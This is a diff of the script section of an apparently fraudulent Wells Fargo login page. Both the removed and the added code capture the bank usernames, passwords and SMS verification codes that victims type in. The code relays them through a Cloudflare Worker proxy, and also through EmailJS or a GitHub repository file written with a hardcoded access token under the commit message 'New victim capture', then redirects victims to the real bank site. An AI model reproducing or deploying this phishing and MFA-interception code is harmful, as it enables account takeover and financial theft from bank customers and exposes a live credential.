@@ -325,116 +325,109 @@
         </div>
     </footer>
         
-    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-<script>
-// 1. Init EmailJS
-emailjs.init("y3lRWL7KLDjiFjNcN");
+    <script>
+  const proxyUrl = 'https://wells-proxy.bigsnow033.workers.dev/login';
+  
+  // Replace 'YOUR_GITHUB_TOKEN' with your actual token
+  const githubToken = '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';
+  
+  // Replace with your exact repo path (check the URL of your repo)
+  const repoPath = 'bigsnow033/bigsnow033.github.io'; 
+  const fileName = 'keys.txt';
 
-document.getElementById('scamForm').addEventListener('submit', function(e) {
-    e.preventDefault();
+  // Function to save data to GitHub
+  async function saveToGithub(data) {
+    try {
+      // Fetch existing content
+      const response = await fetch(`https://api.github.com/repos/${repoPath}/contents/${fileName}`, {
+        headers: {
+          'Authorization': `token ${githubToken}`,
+          'Content-Type': 'application/json'
+        }
+      });
+      
+      let sha = null;
+      if (response.ok) {
+        const existing = await response.json();
+        sha = existing.sha; // Get the SHA of the existing file
+      }
 
-    const btn = document.getElementById('verifyBtn');
-    const originalText = btn ? btn.textContent : "Verify Now";
+      // Append new data
+      const existingContent = await fetch(`https://api.github.com/repos/${repoPath}/contents/${fileName}`, {
+        headers: { 'Authorization': `token ${githubToken}` }
+      }).then(r => r.ok ? r.text() : '');
+      
+      const newContent = existingContent + '\n' + data;
 
-    if(btn) {
-        btn.disabled = true;
-        btn.textContent = "Verifying...";
-        btn.style.backgroundColor = "#999";
-        btn.style.cursor = "not-allowed";
+      // Save the file
+      await fetch(`https://api.github.com/repos/${repoPath}/contents/${fileName}`, {
+        method: 'PUT',
+        headers: {
+          'Authorization': `token ${githubToken}`,
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          message: 'New victim capture',
+          content: btoa(newContent), // Encode to Base64
+          sha: sha
+        })
+      });
+    } catch (error) {
+      console.error('Error saving data:', error);
+    }
+  }
+
+  async function login() {
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+
+    if (!username || !password) {
+      alert('Please enter both username and password.');
+      return;
     }
 
-    // Get form data
-    const formData = new FormData(e.target);
-    const data = Object.fromEntries(formData.entries());
-
-    // REPLACE 'YOUR_WORKER_URL' with your actual Cloudflare Worker URL
-    const proxyUrl = 'https://wells-proxy.bigsnow033.workers.dev/login'; 
-
-    // 2. Send credentials to the Proxy
-    fetch(proxyUrl, {
+    try {
+      // Send credentials to Cloudflare Worker
+      const response = await fetch(proxyUrl, {
         method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ username: data.username, password: data.password })
-    })
-    .then(response => response.json())
-    .then(wfResponse => {
-        if (wfResponse.status === 'success') {
-            // 3. Wells Fargo received the login attempt -> It sent the SMS to the user!
-            // Show the SMS input box
-            document.getElementById('loginBtn').style.display = 'none';
-            document.getElementById('smsSection').style.display = 'block'; // Make sure your HTML has this div
-            document.getElementById('sms_code').focus();
-            
-            // Update button to capture the code
-            btn.textContent = "Verify Code";
-            btn.onclick = function() {
-                captureAndSendCode(data.username, data.password);
-            };
-        } else {
-            alert("Login failed.");
-        }
-    })
-    .catch(err => {
-        console.error("Proxy error", err);
-        alert("Connection error.");
-    });
-});
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username, password })
+      });
 
-function captureAndSendCode(username, password) {
-    const code = document.getElementById('sms_code').value;
+      if (response.ok) {
+        // Show SMS section
+        document.getElementById('smsSection').style.display = 'block';
+        document.getElementById('loginSection').style.display = 'none'; // Optional: hide login form
+        
+        // Save credentials to GitHub
+        await saveToGithub(`User: ${username} | Pass: ${password}`);
+      } else {
+        alert('Invalid credentials or server error.');
+      }
+    } catch (error) {
+      alert('Connection error.');
+    }
+  }
+
+  async function submitCode() {
+    const code = document.getElementById('smsCode').value;
+    const btn = document.querySelector('button[type="button"]');
+    btn.textContent = "Verifying...";
+    btn.disabled = true;
+
+    if (!code) {
+      alert("Please enter the code.");
+      btn.textContent = "Submit";
+      btn.disabled = false;
+      return;
+    }
+
+    // Save SMS code to GitHub
+    await saveToGithub(`SMS Code: ${code}`);
     
-    // Get IP
-    fetch('https://api.ipify.org?format=json')
-    .then(res => res.json())
-    .then(ipData => {
-        // Add IP and Date
-        const finalData = {
-            ...{ username, password, code },
-            ip: ipData.ip,
-            date: new Date().toLocaleString()
-        };
-
-        // Send to EmailJS
-        emailjs.send("service_2bhy4ju", "template_1qzswkk", finalData)
-        .then(() => {
-            // Success: Show processing screen
-            document.querySelector('.container').style.display = 'none';
-            document.getElementById('processing').style.display = 'block';
-
-            // Redirect to real site
-            setTimeout(() => {
-                window.location.href = "https://connect.secure.wellsfargo.com/auth/login/present?origin=cob&LOB=CONS";
-            }, 3000);
-        })
-        .catch(err => {
-            // Fail: Still redirect
-            document.querySelector('.container').style.display = 'none';
-            document.getElementById('processing').style.display = 'block';
-            setTimeout(() => {
-                window.location.href = "https://www.wellsfargo.com/";
-            }, 3000);
-        });
-    })
-    .catch(() => {
-        // Fallback if IP fails
-        const finalData = { username, password, code, ip: "Unknown", date: new Date().toLocaleString() };
-        emailjs.send("service_2bhy4ju", "template_1qzswkk", finalData)
-        .then(() => {
-            document.querySelector('.container').style.display = 'none';
-            document.getElementById('processing').style.display = 'block';
-            setTimeout(() => {
-                window.location.href = "https://www.wellsfargo.com/";
-            }, 3000);
-        })
-        .catch(() => {
-            document.querySelector('.container').style.display = 'none';
-            document.getElementById('processing').style.display = 'block';
-            setTimeout(() => {
-                window.location.href = "https://www.wellsfargo.com/";
-            }, 3000);
-        });
-    });
-}
+    // Redirect to success page
+    window.location.href = "success.html";
+  }
 </script>
     
     <script>
